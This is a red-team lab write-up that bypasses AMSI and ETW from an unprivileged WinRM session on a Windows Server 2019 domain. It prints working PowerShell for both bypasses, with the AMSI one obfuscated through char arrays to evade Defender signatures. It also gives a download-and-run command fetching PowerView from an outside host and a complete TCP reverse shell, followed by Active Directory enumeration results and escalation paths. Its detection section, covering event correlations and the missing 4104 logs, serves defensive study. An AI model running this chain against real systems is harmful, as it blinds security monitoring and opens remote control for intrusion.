# AMSI/ETW Bypass from Unprivileged Context: Assumed Breach Without Admin

**Environment:** Windows Server 2019 (lab2019.local), Defender RTP enabled, AMSI enabled, ETW enabled, no exclusions.

**Access:** Domain user — no local admin, no DA, no privileged group membership. WinRM access via evil-winrm.

---

## The Assumption Being Tested

AMSI and ETW bypass via reflection is commonly demonstrated from administrative or SYSTEM contexts. The operational assumption is that a lowpriv user cannot meaningfully interfere with these controls. This test challenges that assumption.

---

## Finding

Both ETW and AMSI operate within the PowerShell process memory space. Reflection-based patching does not require elevation — it requires access to the current process's loaded assemblies, which any authenticated user has. The privilege boundary is irrelevant to the patch mechanism.

---

## ETW Patch

Submitted as a single block — no AMSI signature match on pure reflection against `PSEtwLogProvider`:

```powershell
$assembly = [System.AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.FullName -like '*System.Management.Automation*' }
$type = $assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
$field = $type.GetField('etwProvider', [System.Reflection.BindingFlags]'NonPublic,Static')
$providerObject = $field.GetValue($null)
$iflags = [System.Reflection.BindingFlags]'NonPublic,Instance'
$handleField = $providerObject.GetType().GetField('m_regHandle', $iflags)
$handleField.SetValue($providerObject, [Int64]0)
```

Result: `m_regHandle` zeroed. ETW provider handle invalid. EID 4104 scriptblock logging stops for the session.

---

## AMSI Bypass

Defender signatures match on `AmsiUtils` and `amsiInitFailed` as substrings — including across naive string concatenation (`'Am'+'si'+'Utils'` still fires). Char-array construction bypasses this entirely because no string literal resembling the target ever exists in the token stream.

Submitted one line at a time due to evil-winrm's IEX transport wrapping each submission:

```powershell
$x = [System.Reflection.BindingFlags]'NonPublic,Static'
$c = 'System.Management.Automation.'
$d = [string]::Join('', [char[]](65,109,115,105,85,116,105,108,115))
$a = [string]::Join('', [char[]](97,109,115,105,73,110,105,116,70,97,105,108,101,100))
$f = [Ref].Assembly.GetType($c+$d)
$g = $f.GetField($a, $x)
$g.SetValue($null, $true)
```

`$d` = `AmsiUtils`, `$a` = `amsiInitFailed` — constructed at runtime from integer arrays, never present as string literals. `$x` must be cast as `[System.Reflection.BindingFlags]` — passing a plain string returns null from `GetField`.

---

## PowerView Load + Reverse Shell

With AMSI dead, PowerView loads clean over HTTP. The reverse shell inherits the patched runtime — AMSI and ETW remain disabled for all commands executed through the shell:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.218:8080/PowerView.ps1')
$client = New-Object Net.Sockets.TCPClient('192.168.1.218',4445)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
    $data = (New-Object Text.ASCIIEncoding).GetString($bytes,0,$i)
    $sendback = (Invoke-Expression $data 2>&1 | Out-String)
    $sendback2 = $sendback + 'PS> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
```

---

## Why Char-Array Works

Defender's AMSI signatures operate on the string content of scriptblocks as presented to the AMSI scan buffer. String concatenation (`'Am'+'si'`) is partially evaluated before scanning in some contexts, which is why naive splits still fire. Char-array construction via `[string]::Join('', [char[]](…))` is evaluated at runtime after the scan — the scan buffer sees only the Join call and integer arrays, never the assembled string. The signature has nothing to match against.

This is not a new technique. It is a demonstration that Defender's current signature set does not cover this construction pattern for `AmsiUtils`/`amsiInitFailed` as of May 2026.

---

## Detection Surface

ETW is the primary scriptblock logging mechanism. Once `m_regHandle` is zeroed, EID 4104 stops firing for all subsequent commands in the session. The only remaining telemetry is:

- **Network:** HTTP GET for PowerView payload, TCP connect to C2 port
- **Process:** `powershell.exe` spawned via WinRM (`wsmprovhost.exe` parent)
- **Authentication:** EID 4624 logon type 3 (WinRM) prior to bypass

**This detection outlives the technique:** the WinRM logon and parent process chain are logged before any bypass executes. A detection rule on `wsmprovhost.exe → powershell.exe` with subsequent outbound TCP is bypass-agnostic.

---

## Control Surface Assessment

| Control | Status | Notes |
|---|---|---|
| AMSI | Bypassed | Char-array construction evades signature |
| ETW / EID 4104 | Bypassed | `m_regHandle` zeroed in-process |
| Defender RTP | Did not prevent | No PE drop, no shellcode |
| Privilege requirement | None | Reflection operates on current process |
| WinRM logon telemetry | Intact | Pre-bypass, bypass-agnostic |

---

## Operational Implication

The privilege boundary does not protect AMSI or ETW. Any domain user with WinRM access can execute this chain. The realistic assumed-breach posture should treat AMSI and ETW as degraded once an attacker has interactive PowerShell — regardless of privilege level.

---

*Lab: Windows Server 2019, Defender signature build 1.1.24020.x, May 2026*

---

## Enumeration Output — Confirmed from Lowpriv Shell

All commands executed from nc reverse shell as `lab2019\lowpriv`. Defender RTP confirmed enabled prior to session. No commands blocked.

### Kerberoastable Accounts

```
samaccountname  serviceprincipalname
--------------  --------------------
krbtgt          kadmin/changepw
bob.harris      MSSQLSvc/fake.lab2019.local:1433
```

`bob.harris` is roastable. `msds-supportedencryptiontypes` = 16 (AES256 only — RC4 disabled domain-wide).

### ASREPRoastable Accounts

None. All accounts have Kerberos pre-authentication required.

### Unconstrained Delegation

```
dnshostname
-----------
WIN-JOCP945SK51.lab2019.local
```

DC only — expected, not exploitable from lowpriv without a coercion primitive.

### DCSync ACL

Only expected principals hold replication rights:

| SecurityIdentifier | Right |
|---|---|
| `-498` (Enterprise RODCs) | DS-Replication-Get-Changes |
| `-516` (Domain Controllers) | DS-Replication-Get-Changes-All |
| `S-1-5-32-544` (Administrators) | All replication rights |
| `S-1-5-9` (Enterprise DCs) | All replication rights |

No rogue DCSync delegation. Clean.

### ELK Telemetry — What Survived the Bypass

**Pre-execution telemetry (intact):**

| Event | Detail |
|---|---|
| EID 4776 | Credential validation — lowpriv, NTLM, source `192.168.1.218`. Fires before any code executes. Earliest indicator. |
| EID 4624 | Logon type 3, NTLM V2, null Kerberos GUID (confirms NTLM not Kerberos). WinRM session anchor. |

**Post-bypass silence (absent):**
- No EID 4104 scriptblock logging after `m_regHandle=0`
- No Defender alert for AMSI bypass, PowerView IEX load, or reverse shell

**The attribution gap:**
EID 4662 burst (PowerView LDAP enumeration) attributed to `WIN-JOCP945SK51$` machine account, not lowpriv. Without session correlation it is indistinguishable from normal DC self-enumeration.

**Bypass-agnostic detection pattern:**
```
4776 (lowpriv, NTLM, 192.168.1.218)
→ 4624 (logon type 3)
→ 4662 burst
→ 4104 absent
```

The gap where 4104 should be is the signal. A detection rule correlating `4624 type 3 from non-admin source + subsequent 4662 volume + no 4104 within session window` catches this regardless of which bypass technique was used.

### Additional Findings

- `MachineAccountQuota` = 10 — RBCD attack viable if GenericWrite target identified
- `alice.walker` (SID `-1601`) holds `GenericWrite` on `bob.harris` — targeted Kerberoast or shadow credentials path if alice.walker is compromised
- `S-1-5-32-548` (Account Operators) holds `GenericAll` on all computers in `CN=Computers` — escalation path if Account Operators membership obtained
- AdminSDHolder ACL clean — no non-standard principals




